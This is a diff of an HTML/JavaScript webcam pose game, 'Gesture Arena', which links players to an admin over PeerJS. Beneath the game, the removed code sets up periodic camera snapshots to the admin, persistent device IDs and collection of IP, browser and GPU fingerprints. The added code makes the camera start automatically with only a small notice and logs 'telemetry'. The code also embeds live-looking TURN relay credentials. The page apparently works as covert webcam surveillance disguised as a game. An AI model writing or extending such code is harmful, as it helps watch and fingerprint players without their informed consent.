@@ -3,1372 +3,945 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>Gesture Arena — 1,000,000 Pt Challenge</title>
-  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands@0.4.1675469240/hands.js" crossorigin="anonymous"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/pose@0.5.1675469404/pose.js" crossorigin="anonymous"></script>
+  <title>Gesture Arena — 1,000,000 Pts Challenge</title>
+
+  <!-- PeerJS & MediaPipe Tasks Vision -->
+  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/pose/pose.js" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
+
   <style>
     :root {
-      --bg: #0b0f19;
-      --panel: #151c2c;
-      --panel-dark: #090d16;
-      --border: #263147;
-      --accent: #38bdf8;
-      --accent-glow: rgba(56, 189, 248, 0.35);
-      --success: #22c55e;
-      --warning: #f59e0b;
-      --danger: #ef4444;
-      --purple: #a855f7;
+      --bg: #070b14;
+      --panel: #0d1526;
+      --border: #1e293b;
+      --cyan: #38bdf8;
+      --green: #10b981;
+      --amber: #f59e0b;
+      --red: #ef4444;
       --text: #f8fafc;
-      --muted: #94a3b8;
+      --muted: #64748b;
     }
-    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-    body { background: var(--bg); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 12px; }
-    .app-wrap { width: 100%; max-width: 560px; display: flex; flex-direction: column; gap: 12px; flex: 1; }
 
-    header { display: flex; justify-content: space-between; align-items: center; background: var(--panel); border: 1px solid var(--border); padding: 10px 14px; border-radius: 12px; }
-    .brand { font-size: 1.1rem; font-weight: 800; color: var(--accent); letter-spacing: 0.3px; }
-    .pill { font-size: 0.75rem; font-weight: 700; padding: 4px 10px; border-radius: 999px; background: rgba(255,255,255,0.05); border: 1px solid var(--border); color: var(--muted); }
-    .pill.ok { color: var(--success); border-color: rgba(34,197,94,0.4); background: rgba(34,197,94,0.1); }
-    .pill.warn { color: var(--warning); border-color: rgba(245,158,11,0.4); background: rgba(245,158,11,0.1); }
-    .pill.err { color: var(--danger); border-color: rgba(239,68,68,0.4); background: rgba(239,68,68,0.1); }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
-    .card { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; padding: 14px; display: flex; flex-direction: column; gap: 12px; }
-
-    /* Optional Username & Giant Start Button */
-    .setup-stack { display: flex; flex-direction: column; gap: 10px; }
-    .input-group { display: flex; flex-direction: column; gap: 4px; }
-    .input-label { font-size: 0.75rem; color: var(--muted); font-weight: 600; display: flex; justify-content: space-between; }
-    .input-label span.opt { color: var(--accent); font-weight: 700; }
-    input[type="text"] { width: 100%; background: var(--panel-dark); border: 1px solid var(--border); color: var(--text); padding: 11px 12px; border-radius: 8px; font-size: 0.95rem; outline: none; }
-    input[type="text"]:focus { border-color: var(--accent); }
-
-    button { background: var(--accent); color: #000; border: none; padding: 10px 16px; border-radius: 8px; font-weight: 800; font-size: 0.92rem; cursor: pointer; white-space: nowrap; transition: transform 0.12s, opacity 0.15s, box-shadow 0.15s; }
-    button:hover { opacity: 0.94; }
-    button:active { transform: scale(0.98); }
-    button.danger { background: var(--danger); color: #fff; }
-    button.secondary { background: transparent; color: var(--text); border: 1px solid var(--border); }
-
-    .giant-start-btn {
+    html, body {
       width: 100%;
-      padding: 18px 24px;
-      font-size: 1.35rem;
-      font-weight: 900;
-      letter-spacing: 0.8px;
-      text-transform: uppercase;
-      border-radius: 12px;
-      background: linear-gradient(135deg, #38bdf8, #22c55e);
-      color: #050811;
-      box-shadow: 0 0 22px var(--accent-glow);
+      height: 100dvh;
+      overflow: hidden;
+      background: var(--bg);
+      color: var(--text);
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
     }
-    .giant-start-btn.running {
-      padding: 12px 18px;
+
+    .app-shell {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+      max-width: 780px;
+      height: 100dvh;
+      margin: 0 auto;
+      padding: 8px 12px;
+      gap: 6px;
+    }
+
+    /* 1. COMPACT HEADER + NICKNAME + PAUSE ROW */
+    .top-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 8px;
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 6px 10px;
+      flex-shrink: 0;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-weight: 800;
       font-size: 1rem;
-      background: var(--danger);
-      color: #fff;
-      box-shadow: none;
+      color: var(--cyan);
+      white-space: nowrap;
     }
 
-    /* 1,000,000 Point Goal Progress Bar */
-    .goal-wrap { background: var(--panel-dark); border: 1px solid var(--border); border-radius: 10px; padding: 10px 12px; display: flex; flex-direction: column; gap: 6px; }
-    .goal-top { display: flex; justify-content: space-between; align-items: center; font-size: 0.76rem; font-weight: 700; }
-    .goal-top .goal-title { color: var(--accent); text-transform: uppercase; letter-spacing: 0.5px; }
-    .goal-top .goal-timer { color: var(--warning); font-family: monospace; font-size: 0.85rem; }
-    .goal-bar-bg { width: 100%; height: 10px; background: rgba(255,255,255,0.07); border-radius: 999px; overflow: hidden; }
-    .goal-bar-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--accent), var(--success)); transition: width 0.25s ease; }
+    .top-controls {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      flex: 1;
+      justify-content: flex-end;
+    }
 
-    .hud-stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; }
-    .stat-box { background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 8px; padding: 8px 6px; text-align: center; }
-    .stat-val { font-size: 1.15rem; font-weight: 800; color: var(--text); }
-    .stat-lbl { font-size: 0.64rem; color: var(--muted); text-transform: uppercase; letter-spacing: 0.4px; margin-top: 2px; }
+    .nick-input {
+      width: 135px;
+      background: #050811;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      color: var(--text);
+      padding: 5px 8px;
+      font-size: 0.82rem;
+      outline: none;
+    }
 
-    /* Target / Directive Banner */
-    .target-banner { display: flex; flex-direction: column; gap: 8px; background: rgba(56,189,248,0.08); border: 2px solid var(--accent); border-radius: 10px; padding: 12px 14px; transition: all 0.2s; }
-    .target-banner.cmd-mode { background: rgba(168, 85, 247, 0.14); border-color: var(--purple); box-shadow: 0 0 18px rgba(168, 85, 247, 0.25); }
-    .target-main { display: flex; align-items: center; justify-content: space-between; gap: 12px; }
-    .target-left { display: flex; align-items: center; gap: 12px; min-width: 0; }
-    .target-icon { font-size: 2.5rem; line-height: 1; flex-shrink: 0; }
-    .target-info { display: flex; flex-direction: column; gap: 2px; min-width: 0; }
-    .target-title { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 1px; color: var(--muted); font-weight: 700; }
-    .target-name { font-size: 1.2rem; font-weight: 900; color: var(--accent); word-break: break-word; }
-    .target-banner.cmd-mode .target-name { color: #e9d5ff; font-size: 1.25rem; }
-    .target-sub { font-size: 0.78rem; color: var(--text); opacity: 0.9; }
+    .nick-input:focus {
+      border-color: var(--cyan);
+    }
 
-    .bars-col { display: flex; flex-direction: column; gap: 5px; align-items: flex-end; flex-shrink: 0; }
-    .hold-bar-wrap { width: 82px; height: 9px; background: rgba(255,255,255,0.1); border-radius: 999px; overflow: hidden; }
-    .hold-bar { height: 100%; width: 0%; background: var(--success); transition: width 0.08s linear; }
-    .time-bar-wrap { width: 82px; height: 5px; background: rgba(255,255,255,0.08); border-radius: 999px; overflow: hidden; }
-    .time-bar { height: 100%; width: 100%; background: var(--warning); transition: width 0.1s linear; }
+    .btn-pause {
+      background: var(--red);
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 5px 10px;
+      font-size: 0.76rem;
+      font-weight: 800;
+      cursor: pointer;
+      white-space: nowrap;
+    }
 
-    .stage { position: relative; width: 100%; aspect-ratio: 4/3; background: #000; border-radius: 10px; overflow: hidden; border: 1px solid var(--border); display: flex; align-items: center; justify-content: center; }
-    video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-    canvas#overlayCanvas { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); pointer-events: none; }
+    .btn-pause.paused {
+      background: var(--green);
+    }
 
-    .toast-banner {
+    .conn-pill {
+      font-size: 0.72rem;
+      font-weight: 700;
+      padding: 4px 9px;
+      border-radius: 999px;
+      background: rgba(16, 185, 129, 0.14);
+      border: 1px solid rgba(16, 185, 129, 0.45);
+      color: #34d399;
+      white-space: nowrap;
+    }
+
+    .conn-pill.offline {
+      background: rgba(245, 158, 11, 0.14);
+      border-color: rgba(245, 158, 11, 0.45);
+      color: #fbbf24;
+    }
+
+    /* 2. COMPACT GOAL + 4 STAT PILLS STRIP */
+    .stats-strip {
+      display: grid;
+      grid-template-columns: 1.55fr repeat(4, 1fr);
+      gap: 6px;
+      flex-shrink: 0;
+    }
+
+    .goal-card, .stat-card {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 6px 8px;
+    }
+
+    .goal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 0.7rem;
+      font-weight: 800;
+      color: var(--cyan);
+      margin-bottom: 5px;
+    }
+
+    .timer-text {
+      color: var(--amber);
+      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+    }
+
+    .goal-track {
+      width: 100%;
+      height: 6px;
+      background: #1e293b;
+      border-radius: 999px;
+      overflow: hidden;
+    }
+
+    .goal-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #10b981, #38bdf8);
+      transition: width 0.25s ease;
+    }
+
+    .stat-card {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+
+    .stat-val {
+      font-size: 0.92rem;
+      font-weight: 800;
+      color: var(--text);
+      line-height: 1.1;
+    }
+
+    .stat-lbl {
+      font-size: 0.6rem;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      margin-top: 2px;
+    }
+
+    /* 3. CURRENT CHALLENGE BANNER */
+    .challenge-card {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+      background: linear-gradient(135deg, rgba(14, 116, 144, 0.24), rgba(13, 21, 38, 0.92));
+      border: 1.5px solid #0ea5e9;
+      border-radius: 10px;
+      padding: 7px 12px;
+      flex-shrink: 0;
+    }
+
+    .challenge-info {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      min-width: 0;
+    }
+
+    .challenge-icon {
+      font-size: 1.85rem;
+      line-height: 1;
+      flex-shrink: 0;
+    }
+
+    .challenge-tier {
+      font-size: 0.64rem;
+      font-weight: 800;
+      color: #94a3b8;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+
+    .challenge-title {
+      font-size: 1.05rem;
+      font-weight: 800;
+      color: var(--cyan);
+      line-height: 1.15;
+    }
+
+    .challenge-desc {
+      font-size: 0.76rem;
+      color: #e2e8f0;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .challenge-Right {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      gap: 5px;
+      flex-shrink: 0;
+    }
+
+    .mini-bars {
+      width: 68px;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+
+    .mini-bar {
+      width: 100%;
+      height: 5px;
+      background: #1e293b;
+      border-radius: 99px;
+      overflow: hidden;
+    }
+
+    .mini-bar-fill {
+      height: 100%;
+      width: 0%;
+      background: var(--amber);
+      transition: width 0.1s linear;
+    }
+
+    .btn-skip {
+      background: rgba(255, 255, 255, 0.08);
+      border: 1px solid #334155;
+      color: #cbd5e1;
+      border-radius: 5px;
+      padding: 2px 7px;
+      font-size: 0.65rem;
+      cursor: pointer;
+    }
+
+    /* 4. VIDEO STAGE (EXPANDS TO FILL SCREEN WITHOUT SCROLLING) */
+    .video-stage {
+      position: relative;
+      flex: 1;
+      min-height: 0;
+      width: 100%;
+      background: #03060c;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    #webcamVideo, #poseCanvas {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transform: scaleX(-1);
+    }
+
+    #poseCanvas {
       position: absolute;
-      top: 10px;
+      inset: 0;
+      pointer-events: none;
+    }
+
+    /* Minimal Non-Blocking Camera Permission Banner (Only shown if browser blocks permission) */
+    .cam-status-toast {
+      position: absolute;
+      top: 12px;
       left: 50%;
       transform: translateX(-50%);
-      background: rgba(11, 15, 25, 0.9);
-      border: 1px solid var(--border);
-      padding: 6px 14px;
-      border-radius: 999px;
-      font-size: 0.8rem;
+      z-index: 25;
+      background: rgba(15, 23, 42, 0.92);
+      border: 1px solid var(--amber);
+      border-radius: 8px;
+      padding: 8px 14px;
+      font-size: 0.78rem;
+      color: #fde68a;
+      text-align: center;
+      max-width: 90%;
+      display: none;
+      cursor: pointer;
+    }
+
+    /* Pose Hold Flash Overlay */
+    .pose-success-banner {
+      position: absolute;
+      top: 12px;
+      right: 12px;
+      z-index: 20;
+      background: rgba(16, 185, 129, 0.9);
+      color: #04130d;
       font-weight: 800;
-      z-index: 4;
-      pointer-events: none;
+      font-size: 0.82rem;
+      padding: 5px 12px;
+      border-radius: 999px;
       display: none;
     }
 
-    .overlay-msg { position: absolute; inset: 0; background: rgba(11,15,25,0.88); display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 12px; padding: 20px; text-align: center; z-index: 5; }
-    .overlay-msg.hidden { display: none; }
-    .overlay-msg h3 { font-size: 1.25rem; color: var(--text); }
-    .overlay-msg p { font-size: 0.88rem; color: var(--muted); max-width: 320px; line-height: 1.45; }
+    /* 5. ADMIN DIRECT MESSAGE POP-UP OVER VIDEO FEED */
+    .admin-overlay {
+      position: absolute;
+      bottom: 10px;
+      left: 10px;
+      right: 10px;
+      z-index: 35;
+      background: rgba(8, 13, 25, 0.86);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border: 1.5px solid rgba(56, 189, 248, 0.65);
+      border-radius: 12px;
+      padding: 9px 12px;
+      box-shadow: 0 8px 28px rgba(0, 0, 0, 0.7);
+      transition: all 0.22s ease;
+    }
 
-    /* Admin-initiated chat box: hidden until admin sends first message */
-    .chat-drawer { display: none; flex-direction: column; gap: 8px; background: var(--panel); border: 1px solid var(--accent); border-radius: 12px; padding: 12px; }
-    .chat-drawer.unlocked { display: flex; }
-    .chat-header { font-size: 0.78rem; font-weight: 700; color: var(--accent); text-transform: uppercase; letter-spacing: 0.5px; display: flex; justify-content: space-between; }
-    .chat-log { max-height: 130px; overflow-y: auto; background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 8px; padding: 8px; display: flex; flex-direction: column; gap: 6px; font-size: 0.85rem; }
-    .chat-bubble { padding: 6px 10px; border-radius: 6px; max-width: 85%; word-break: break-word; }
-    .chat-bubble.admin { align-self: flex-start; background: rgba(56,189,248,0.18); border: 1px solid rgba(56,189,248,0.35); }
-    .chat-bubble.me { align-self: flex-end; background: rgba(34,197,94,0.18); border: 1px solid rgba(34,197,94,0.35); }
-    .chat-input-row { display: flex; gap: 8px; }
+    .admin-overlay.pulse-alert {
+      border-color: var(--amber);
+      box-shadow: 0 0 25px rgba(245, 158, 11, 0.55);
+      animation: popIn 0.45s ease-out;
+    }
 
-    details.debug { width: 100%; font-size: 0.74rem; color: var(--muted); margin-top: auto; padding-top: 8px; }
-    details.debug summary { cursor: pointer; user-select: none; }
-    .debug-content { background: #070a10; border: 1px solid var(--border); border-radius: 6px; padding: 8px; margin-top: 4px; font-family: monospace; word-break: break-all; }
+    .admin-overlay.minimized .admin-body {
+      display: none;
+    }
+
+    @keyframes popIn {
+      0%   { transform: translateY(14px) scale(0.97); opacity: 0.5; }
+      100% { transform: translateY(0) scale(1); opacity: 1; }
+    }
+
+    .admin-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 0.7rem;
+      font-weight: 800;
+      letter-spacing: 0.05em;
+      color: var(--cyan);
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .admin-body {
+      margin-top: 6px;
+    }
+
+    .admin-messages {
+      max-height: 78px;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      padding: 6px 8px;
+      background: rgba(3, 6, 12, 0.65);
+      border: 1px solid rgba(30, 41, 59, 0.85);
+      border-radius: 8px;
+      margin-bottom: 6px;
+    }
+
+    .msg-pill {
+      display: inline-block;
+      padding: 4px 9px;
+      border-radius: 7px;
+      font-size: 0.8rem;
+      max-width: 88%;
+      word-break: break-word;
+    }
+
+    .msg-pill.admin {
+      align-self: flex-start;
+      background: rgba(14, 165, 233, 0.24);
+      border: 1px solid rgba(56, 189, 248, 0.5);
+      color: #f8fafc;
+      font-weight: 600;
+    }
+
+    .msg-pill.user {
+      align-self: flex-end;
+      background: rgba(16, 185, 129, 0.22);
+      border: 1px solid rgba(16, 185, 129, 0.45);
+      color: #ecfdf5;
+    }
+
+    .admin-input-row {
+      display: flex;
+      gap: 6px;
+    }
+
+    .admin-input-row input {
+      flex: 1;
+      background: rgba(4, 7, 15, 0.92);
+      border: 1px solid #334155;
+      border-radius: 7px;
+      color: #fff;
+      padding: 6px 10px;
+      font-size: 0.82rem;
+      outline: none;
+    }
+
+    .admin-input-row input:focus {
+      border-color: var(--cyan);
+    }
+
+    .admin-input-row button {
+      background: var(--cyan);
+      color: #04070d;
+      font-weight: 800;
+      border: none;
+      border-radius: 7px;
+      padding: 0 14px;
+      font-size: 0.8rem;
+      cursor: pointer;
+    }
+
+    /* 6. ULTRA-COMPACT FOOTER DEBUG LINE */
+    details.debug-drawer {
+      font-size: 0.68rem;
+      color: var(--muted);
+      flex-shrink: 0;
+    }
+
+    details.debug-drawer summary {
+      cursor: pointer;
+      user-select: none;
+    }
+
+    details.debug-drawer pre {
+      position: absolute;
+      bottom: 28px;
+      left: 12px;
+      right: 12px;
+      max-height: 110px;
+      overflow-y: auto;
+      background: rgba(4, 7, 15, 0.95);
+      border: 1px solid var(--border);
+      padding: 6px;
+      border-radius: 6px;
+      z-index: 50;
+      color: #94a3b8;
+    }
+
+    @media (max-width: 600px) {
+      .stats-strip {
+        grid-template-columns: repeat(4, 1fr);
+      }
+      .goal-card {
+        grid-column: span 4;
+      }
+      .nick-input {
+        width: 95px;
+      }
+    }
   </style>
 </head>
 <body>
-
-  <div class="app-wrap">
-    <header>
-      <div class="brand">🖐️ Gesture Arena</div>
-      <span id="connPill" class="pill">Connecting…</span>
+  <div class="app-shell">
+    <!-- 1. TOP HEADER BAR -->
+    <header class="top-bar">
+      <div class="brand">✋ Gesture Arena</div>
+      <div class="top-controls">
+        <input id="nicknameInput" class="nick-input" type="text" placeholder="Nickname..." value="user" />
+        <button id="pauseBtn" class="btn-pause" type="button">⏹ PAUSE</button>
+        <span id="connBadge" class="conn-pill">Live Connected</span>
+      </div>
     </header>
 
-    <div class="card">
-      <div class="setup-stack">
-        <div class="input-group">
-          <div class="input-label">
-            <span>Player Nickname</span>
-            <span class="opt">OPTIONAL (Auto-assigned if blank)</span>
+    <!-- 2. GOAL & STATS STRIP -->
+    <section class="stats-strip">
+      <div class="goal-card">
+        <div class="goal-header">
+          <span id="goalLabel">🏆 GOAL: 0 / 1,000,000 PTS (0%)</span>
+          <span id="timerDisplay" class="timer-text">05:00</span>
+        </div>
+        <div class="goal-track">
+          <div id="goalFill" class="goal-fill"></div>
+        </div>
+      </div>
+      <div class="stat-card">
+        <div id="pointsVal" class="stat-val">0</div>
+        <div class="stat-lbl">POINTS</div>
+      </div>
+      <div class="stat-card">
+        <div id="tierVal" class="stat-val">1 / 16</div>
+        <div class="stat-lbl">POSE TIER</div>
+      </div>
+      <div class="stat-card">
+        <div id="streakVal" class="stat-val">0</div>
+        <div class="stat-lbl">STREAK</div>
+      </div>
+      <div class="stat-card">
+        <div id="statusVal" class="stat-val">Active</div>
+        <div class="stat-lbl">STATUS</div>
+      </div>
+    </section>
+
+    <!-- 3. CURRENT CHALLENGE BANNER -->
+    <section class="challenge-card">
+      <div class="challenge-info">
+        <div id="chalIcon" class="challenge-icon">👍</div>
+        <div style="min-width:0;">
+          <div id="chalTierText" class="challenge-tier">TIER 1 OF 16 • HAND GESTURE</div>
+          <div id="chalTitle" class="challenge-title">Thumbs Up</div>
+          <div id="chalDesc" class="challenge-desc">Show a clear Thumbs Up to the camera (+15,000 pts)</div>
+        </div>
+      </div>
+      <div class="challenge-Right">
+        <div class="mini-bars">
+          <div class="mini-bar"><div id="holdBarFill" class="mini-bar-fill"></div></div>
+        </div>
+        <button id="skipPoseBtn" class="btn-skip" type="button" title="Cycle to next challenge">Next Pose ⏭</button>
+      </div>
+    </section>
+
+    <!-- 4. VIDEO STAGE + FLOATING ADMIN DIRECT MESSAGE OVERLAY -->
+    <main class="video-stage">
+      <video id="webcamVideo" autoplay playsinline muted></video>
+      <canvas id="poseCanvas"></canvas>
+
+      <!-- Subtle permission notice ONLY if camera is blocked in browser settings -->
+      <div id="camToast" class="cam-status-toast">
+        ⚠️ Camera access blocked by browser. Click the address bar lock/camera icon → Set Camera to "Allow" (or tap here to retry).
+      </div>
+
+      <div id="poseMatchBadge" class="pose-success-banner">🔥 HOLD POSE...</div>
+
+      <!-- FLOATING ADMIN DIRECT MESSAGE HUD OVER VIDEO -->
+      <div id="adminOverlay" class="admin-overlay">
+        <div id="adminHeaderToggle" class="admin-header">
+          <span>💬 DIRECT MESSAGE FROM ADMIN</span>
+          <span id="adminUnlockLabel" style="color:#94a3b8;">REPLY UNLOCKED ▾</span>
+        </div>
+        <div class="admin-body">
+          <div id="adminMsgList" class="admin-messages">
+            <div class="msg-pill admin">Admin: Welcome to Gesture Arena! Camera starts automatically.</div>
           </div>
-          <input type="text" id="nameInput" maxlength="20" placeholder="Leave blank for instant anonymous play…" autocomplete="off" />
-        </div>
-        <button id="startBtn" class="giant-start-btn" onclick="toggleGame()">🚀 START 1,000,000 PT CHALLENGE</button>
-      </div>
-
-      <div class="goal-wrap">
-        <div class="goal-top">
-          <span class="goal-title">🏆 Goal: <span id="goalProgressText">0 / 1,000,000 pts</span></span>
-          <span class="goal-timer" id="cycleTimerText">05:00</span>
-        </div>
-        <div class="goal-bar-bg">
-          <div class="goal-bar-fill" id="goalBarFill"></div>
+          <form id="adminReplyForm" class="admin-input-row">
+            <input id="adminReplyInput" type="text" placeholder="Reply to admin..." autocomplete="off" />
+            <button type="submit">Send</button>
+          </form>
         </div>
       </div>
+    </main>
 
-      <div class="hud-stats">
-        <div class="stat-box">
-          <div class="stat-val" id="scoreVal">0</div>
-          <div class="stat-lbl">Points</div>
-        </div>
-        <div class="stat-box">
-          <div class="stat-val" id="tierVal">1 / 16</div>
-          <div class="stat-lbl">Pose Tier</div>
-        </div>
-        <div class="stat-box">
-          <div class="stat-val" id="streakVal">0</div>
-          <div class="stat-lbl">Streak</div>
-        </div>
-        <div class="stat-box">
-          <div class="stat-val" id="detectedVal">—</div>
-          <div class="stat-lbl">Status</div>
-        </div>
-      </div>
-
-      <div class="target-banner" id="targetBanner">
-        <div class="target-main">
-          <div class="target-left">
-            <div class="target-icon" id="targetIcon">👍</div>
-            <div class="target-info">
-              <span class="target-title" id="targetHeaderLabel">Current Pose Challenge</span>
-              <span class="target-name" id="targetName">Tap Start Above</span>
-              <span class="target-sub" id="targetHint">Complete poses to climb tiers. Timeouts deduct points & backtrack!</span>
-            </div>
-          </div>
-          <div class="bars-col" id="barsCol">
-            <div class="hold-bar-wrap" title="Pose Hold Progress">
-              <div class="hold-bar" id="holdBar"></div>
-            </div>
-            <div class="time-bar-wrap" title="Time Remaining before Backtrack">
-              <div class="time-bar" id="timeBar"></div>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <div class="stage" onclick="handleStageTap()">
-        <video id="camVideo" playsinline webkit-playsinline muted autoplay></video>
-        <canvas id="overlayCanvas" width="640" height="480"></canvas>
-        <div class="toast-banner" id="toastBanner"></div>
-
-        <div class="overlay-msg" id="statusOverlay">
-          <h3 id="overlayTitle">Initializing Camera…</h3>
-          <p id="overlayDesc">Allow camera access or tap the big Start button above to begin your 5-minute run to 1,000,000 points.</p>
-          <button id="retryCamBtn" class="giant-start-btn" style="max-width:280px;" onclick="event.stopPropagation(); forceEngageCameraAndStart();">🎥 Enable Camera &amp; Start</button>
-        </div>
-
-        <div class="overlay-msg hidden" id="lockOverlay">
-          <h3>🔒 Session Paused by Admin</h3>
-          <p>Please wait for the administrator to unlock your session.</p>
-        </div>
-      </div>
-    </div>
-
-    <!-- Admin-initiated messaging drawer (hidden until admin messages first) -->
-    <div class="chat-drawer" id="chatDrawer">
-      <div class="chat-header">
-        <span>💬 Direct Message from Admin</span>
-        <span style="color:var(--muted);font-weight:400;">Reply Unlocked</span>
-      </div>
-      <div class="chat-log" id="chatLog"></div>
-      <div class="chat-input-row">
-        <input type="text" id="chatInput" maxlength="200" placeholder="Reply to admin..." onkeydown="if(event.key==='Enter') sendReply()" />
-        <button onclick="sendReply()">Send</button>
-      </div>
-    </div>
-
-    <details class="debug">
+    <!-- 5. COLLAPSIBLE DEBUG LOG -->
+    <details class="debug-drawer">
       <summary>[GA] Connection & System Debug</summary>
-      <div class="debug-content" id="debugLine">Peer: Initializing…</div>
+      <pre id="debugLog">[GA] Initializing auto-camera & telemetry...</pre>
     </details>
   </div>
 
   <script>
-    // === SHARED CONFIG (Identical across index.html and admin.html) ===
-    const CHANNEL = "lacy-vibe-9x4q";
-    const ADMIN_PEER_ID = `ga-${CHANNEL}-admin`;
-    const SNAPSHOT_INTERVAL_MS = 8000;          // 8-second regular snapshot interval
-    const MAX_BUFFERED_SNAPSHOTS = 120;
+    // =========================================================================
+    // 1. EXPANDED 16-TIER FULL-BODY & GESTURE CHALLENGES
+    // =========================================================================
     const GOAL_POINTS = 1000000;
-    const GAME_CYCLE_SECONDS = 300;             // 5-minute cycle
-
-    const ICE_SERVERS = [
-      { urls: "stun:stun.l.google.com:19302" },
-      { urls: "stun:stun.relay.metered.ca:80" },
-      { urls: ["turn:global.relay.metered.ca:80",
-               "turn:global.relay.metered.ca:80?transport=tcp",
-               "turn:global.relay.metered.ca:443",
-               "turns:global.relay.metered.ca:443?transport=tcp"],
-        username: "157815d4b2b7c36cb6dde13e",
-        credential: "upgZIOhHpGSSPEgs" }
-    ];
-    const PEER_OPTS = { config: { iceServers: ICE_SERVERS, iceCandidatePoolSize: 4 }, debug: 1 };
-
-    // === STORAGE & IDENTITY HELPERS ===
-    let memoryStore = {};
-    function safeGet(key) {
-      try { return localStorage.getItem(key); } catch (e) { return memoryStore[key] || null; }
-    }
-    function safeSet(key, val) {
-      try { localStorage.setItem(key, val); } catch (e) { memoryStore[key] = val; }
-    }
-    function randomChars(len) {
-      const chars = "abcdefghjkmnpqrstuvwxyz23456789";
-      let out = "";
-      for (let i = 0; i < len; i++) out += chars[Math.floor(Math.random() * chars.length)];
-      return out;
-    }
-
-    let deviceId = safeGet("ga_device_id");
-    if (!deviceId) {
-      deviceId = randomChars(8);
-      safeSet("ga_device_id", deviceId);
-    }
-    const tabSuffix = randomChars(4);
-    const myPeerId = `ga-${CHANNEL}-p-${deviceId}-${tabSuffix}`;
-
-    const savedName = safeGet("ga_player_name");
-    if (savedName) document.getElementById("nameInput").value = savedName;
-
-    // === DEVICE, BROWSER & NETWORK METADATA ===
-    function detectDevice() {
-      const ua = navigator.userAgent || "";
-      const plat = navigator.platform || "";
-      const isIPadOS = (plat === "MacIntel" && navigator.maxTouchPoints > 1) || /iPad/i.test(ua);
-      if (/iPhone|iPod/i.test(ua) || isIPadOS) return "iPhone";
-      if (/Android/i.test(ua)) return "Android";
-      if (/Win/i.test(plat) || /Windows/i.test(ua)) return "Windows";
-      if (/Mac/i.test(plat) || /Macintosh/i.test(ua)) return "Mac";
-      return "Other";
-    }
-
-    function detectBrowser() {
-      const ua = navigator.userAgent || "";
-      if (/Edg\/([\d.]+)/.test(ua)) return "Edge " + RegExp.$1.split(".")[0];
-      if (/OPR\/([\d.]+)/.test(ua)) return "Opera " + RegExp.$1.split(".")[0];
-      if (/CriOS\/([\d.]+)/.test(ua)) return "Chrome iOS " + RegExp.$1.split(".")[0];
-      if (/FxiOS\/([\d.]+)/.test(ua)) return "Firefox iOS " + RegExp.$1.split(".")[0];
-      if (/Chrome\/([\d.]+)/.test(ua) && !/Edg/.test(ua)) return "Chrome " + RegExp.$1.split(".")[0];
-      if (/Firefox\/([\d.]+)/.test(ua)) return "Firefox " + RegExp.$1.split(".")[0];
-      if (/Version\/([\d.]+).*Safari/.test(ua)) return "Safari " + RegExp.$1.split(".")[0];
-      return "Browser";
-    }
-
-    function detectGPU() {
-      try {
-        const c = document.createElement("canvas");
-        const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
-        if (!gl) return "unknown";
-        const ext = gl.getExtension("WEBGL_debug_renderer_info");
-        return ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : "WebGL";
-      } catch (e) {
-        return "unknown";
-      }
-    }
-
-    const clientMeta = {
-      ip: "fetching...",
-      browser: detectBrowser(),
